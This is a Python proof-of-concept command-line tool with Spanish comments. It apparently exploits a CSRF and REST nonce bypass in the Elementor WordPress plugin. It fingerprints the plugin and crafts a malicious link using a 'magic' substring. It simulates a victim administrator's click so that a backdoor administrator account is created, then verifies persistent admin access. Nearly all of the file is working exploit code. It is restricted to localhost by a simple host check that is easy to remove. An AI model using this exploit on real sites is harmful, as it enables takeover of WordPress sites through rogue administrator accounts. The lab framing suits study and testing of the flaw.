#!/usr/bin/env python3
"""cli/poc.py — CLI unificado del laboratorio Elementor CSRF (bypass de nonce REST).

Fases:
    check     fingerprint no autenticado (readme.txt + rutas REST)
    craft     genera el enlace malicioso y el correo de phishing simulado
    attack    simula el clic de la víctima: login -> GET con cookies -> 201/401
    verify    comprueba que la cuenta creada es administradora de verdad
    all       check -> craft -> attack -> verify

Fricción responsable (heredada del estilo del lab de CVE-2026-93485):
  * Solo http/https.
  * Solo hosts locales (localhost/127.0.0.1/::1): el CLI se niega a salir
    del laboratorio.
  * Las fases invasivas (attack/verify) exigen --acepta-responsabilidad.

Ejemplos:
    python3 cli/poc.py all --acepta-responsabilidad
    python3 cli/poc.py attack --acepta-responsabilidad \\
        --username sombra --password 'Mi P@ss&2026!' --email sombra@lab.test
    python3 cli/poc.py verify --acepta-responsabilidad --username sombra \\
        --password 'Mi P@ss&2026!'
"""
from __future__ import annotations

import argparse
import http.cookiejar
import json
import pathlib
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

HOSTS_PERMITIDOS = {"localhost", "127.0.0.1", "::1"}
UA = "ElementorCSRF-lab/1.0 (solo localhost)"


# ---------------------------------------------------------------- infra baja
class Cliente:
    """Cliente HTTP mínimo con cookiejar: simula el navegador de la víctima."""

    def __init__(self, base_url: str):
        self.base = base_url.rstrip("/")
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )
        self.opener.addheaders = [("User-Agent", UA)]

    def pedir(self, ruta_o_url: str, data: dict | None = None) -> tuple[int, str]:
        url = ruta_o_url if ruta_o_url.startswith("http") else self.base + ruta_o_url
        cuerpo = urllib.parse.urlencode(data).encode() if data else None
        req = urllib.request.Request(url, data=cuerpo, method="GET" if not data else "POST")
        try:
            with self.opener.open(req, timeout=15) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")


def validar_base(base_url: str) -> str:
    """Solo http/https y solo hosts de laboratorio."""
    p = urllib.parse.urlparse(base_url)
    if p.scheme not in ("http", "https"):
        sys.exit(f"[!] scheme no permitido: {p.scheme!r}")
    host = (p.hostname or "").lower()
    if host not in HOSTS_PERMITIDOS:
        sys.exit(f"[!] host no permitido: {host!r}. Este CLI solo opera en localhost.")
    return f"{p.scheme}://{p.netloc}"


def login(c: Cliente, usuario: str, clave: str) -> bool:
    """Login clásico en wp-login.php (respeta el testcookie)."""
    c.pedir("/wp-login.php")  # deja wordpress_test_cookie en el jar
    _, cuerpo = c.pedir(
        "/wp-login.php",
        data={
            "log": usuario,
            "pwd": clave,
            "wp-submit": "Log In",
            "redirect_to": f"{c.base}/wp-admin/",
            "testcookie": "1",
        },
    )
    return any("wordpress_logged_in" in ck.name for ck in c.jar)


# ------------------------------------------------------------------- fases
def fase_check(c: Cliente) -> int:
    print(f"[*] check contra {c.base}")
    _, cuerpo = c.pedir("/wp-content/plugins/elementor/readme.txt")
    m = re.search(r"^Stable tag:\s*(\S+)", cuerpo, re.M)
    print(f"    Elementor Stable tag = {m.group(1) if m else '?'}")
    codigo, _ = c.pedir("/wp-json/elementor/v1/events/libs/mixpanel.js")
    print(f"    GET /wp-json/elementor/v1/events/libs/mixpanel.js -> HTTP {codigo}")
    print("    módulo Editor Events registrado" if codigo == 401 else "    módulo ausente")
    return 0


def enlace_ataque(base: str, cfg: dict) -> str:
    params = {
        "_method": "POST",
        "username": cfg["username"],
        "email": cfg["email"],
        "password": cfg["password"],
        "roles[]": "administrator",
        # Slashes LITERALES en el URI crudo: %2F no dispararía el strpos.
        "x": "elementor/v1/events/",
    }
    return f"{base}/wp-json/wp/v2/users?{urllib.parse.urlencode(params, safe='/', quote_via=urllib.parse.quote)}"


def fase_craft(base: str, cfg: dict) -> str:
    url = enlace_ataque(base, cfg)
    out = pathlib.Path("exploit/enlace-malicioso.txt")
    out.parent.mkdir(exist_ok=True)
    out.write_text(url + "\n")
    print(f"[+] enlace malicioso:\n    {url}\n[+] guardado en {out}")
    return url


def fase_attack(c: Cliente, cfg: dict, etiqueta: str) -> int:
    print(f"[*] attack contra {c.base} ({etiqueta})")
    if not login(c, cfg["admin_user"], cfg["admin_pass"]):
        print("[!] la víctima no pudo iniciar sesión (¿lab levantado?)")
        return 1
    print("    víctima autenticada (wordpress_logged_in_* en el jar)")

    limpia = enlace_ataque(c.base, cfg).rsplit("&x=", 1)[0]
    codigo, cuerpo = c.pedir(limpia)
    print(f"    SIN subcadena mágica -> HTTP {codigo} ({json_msg(cuerpo)})")

    codigo, cuerpo = c.pedir(enlace_ataque(c.base, cfg))
    print(f"    CON subcadena mágica -> HTTP {codigo}")
    if codigo == 201:
        datos = json.loads(cuerpo)
        print(f'    [PWNED] usuario "{datos.get("username")}" creado, roles={datos.get("roles")}')
        return 0
    print(f"    [RESISTE] ({json_msg(cuerpo)})")
    return 2


def fase_verify(c: Cliente, cfg: dict) -> int:
    print(f"[*] verify: login como la puerta trasera '{cfg['username']}'")
    bt = Cliente(c.base)
    if not login(bt, cfg["username"], cfg["password"]):
        print("[!] la cuenta creada no puede loguearse")
        return 1
    codigo, cuerpo = bt.pedir("/wp-admin/users.php")
    admin = codigo == 200 and cfg["username"] in cuerpo
    print(f"    /wp-admin/users.php -> HTTP {codigo} ({'acceso total' if admin else 'sin acceso'})")
    codigo, cuerpo = bt.pedir(
        "/wp-json/wp/v2/users/me?context=edit&x=elementor/v1/events/"
    )
    try:
        roles = json.loads(cuerpo).get("roles")
    except json.JSONDecodeError:
        roles = None
    print(f"    REST self-check (re-usando el bypass) -> HTTP {codigo}, roles={roles}")
    if roles == ["administrator"]:
        print('    [CONFIRMADO] administrator sin nonce: persistencia total.')
        return 0
    return 2


def json_msg(cuerpo: str) -> str:
    try:
        d = json.loads(cuerpo)
        return d.get("code", "") or str(d)[:80]
    except json.JSONDecodeError:
        return cuerpo[:80].replace("\n", " ")


# --------------------------------------------------------------------- main
def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("fase", choices=["check", "craft", "attack", "verify", "all"])
    ap.add_argument("--base-url", default="http://localhost:8085")
    ap.add_argument("--acepta-responsabilidad", action="store_true",
                    help="requerido para attack/verify: confirma que el objetivo es tu laboratorio local")
    ap.add_argument("--etiqueta", default="victima-4.3.1")
    ap.add_argument("--admin-user", default="admin")
    ap.add_argument("--admin-pass", default="admin")
    ap.add_argument("--username", default="csrfadmin")
    ap.add_argument("--password", default="csrfadmin-PoC-2026")
    ap.add_argument("--email", default="csrfadmin@lab.test")
    a = ap.parse_args()

    base = validar_base(a.base_url)
    cfg = vars(a)

    if a.fase in ("attack", "verify", "all") and not a.acepta_responsabilidad:
        print("[!] esta fase modifica el sitio de destino. Reejecuta con --acepta-responsabilidad")
        print("    (y solo contra http://localhost:808X, tu laboratorio)")
        return 1

    rc = 0
    if a.fase in ("check", "all"):
        rc = fase_check(Cliente(base)) or rc
    if a.fase in ("craft", "all"):
        fase_craft(base, cfg)
    if a.fase in ("attack", "all"):
        rc = fase_attack(Cliente(base), cfg, a.etiqueta) or rc
    if a.fase in ("verify", "all"):
        rc = fase_verify(Cliente(base), cfg) or rc
    return rc


if __name__ == "__main__":
    sys.exit(main())
